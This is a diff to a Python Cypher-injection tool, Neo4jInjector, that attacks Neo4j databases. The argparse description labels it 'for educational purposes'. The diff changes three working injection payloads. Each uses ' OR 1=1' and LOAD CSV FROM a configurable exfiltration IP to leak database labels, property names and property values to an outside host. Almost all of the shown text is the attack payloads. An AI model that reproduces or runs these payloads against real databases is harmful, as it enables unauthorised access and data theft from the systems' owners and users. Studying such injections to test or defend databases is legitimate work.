@@ -87,14 +87,14 @@ class Neo4jInjector:
 
     def exfil_data(self):
         print("Dumping Labels")
-        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM 'http://{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")
         label = input("Enter Label: ")
 
         print("Dumping Properties")
-        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")
 
         print("Dumping Value of Properties")
-        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT x,p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")
 
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
